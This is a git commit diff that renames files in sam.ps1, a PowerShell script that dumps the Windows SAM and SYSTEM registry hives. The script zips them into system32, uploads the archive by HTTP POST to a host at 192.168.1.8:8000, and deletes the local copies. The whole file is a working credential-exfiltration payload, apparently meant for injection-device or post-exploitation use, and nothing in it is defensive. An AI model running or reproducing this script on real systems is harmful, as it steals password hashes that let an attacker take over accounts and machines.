a22da78f7b821c842f6f01c581032a3e1f913043
Lex <104235290+VBV11@users.noreply.github.com>
2026-07-02 11:58:43 +0200

    Update sam.ps1

--- sam.ps1
+++ sam.ps1
@@ -1,8 +1,8 @@
-reg save hklm\sam 1337OMGsam;
-reg save hklm\system 1337OMGsys;
-Compress-Archive -Path "$PWD\1337OMGsys", "$PWD\1337OMGsam" -DestinationPath "C:\WINDOWS\system32\OMGdump.zip" -Force;
-$file = [IO.File]::ReadAllBytes("C:\WINDOWS\system32\OMGdump.zip");
+reg save hklm\sam sam;
+reg save hklm\system sys;
+Compress-Archive -Path "$PWD\sys", "$PWD\sam" -DestinationPath "C:\WINDOWS\system32\dump.zip" -Force;
+$file = [IO.File]::ReadAllBytes("C:\WINDOWS\system32\dump.zip");
 iwr "http://192.168.1.8:8000" -Method POST -Body $file -UseBasicParsing;
-remove-item 1337OMGsys;
-remove-item 1337OMGsam;
+remove-item sys;
+remove-item sam;
 exit
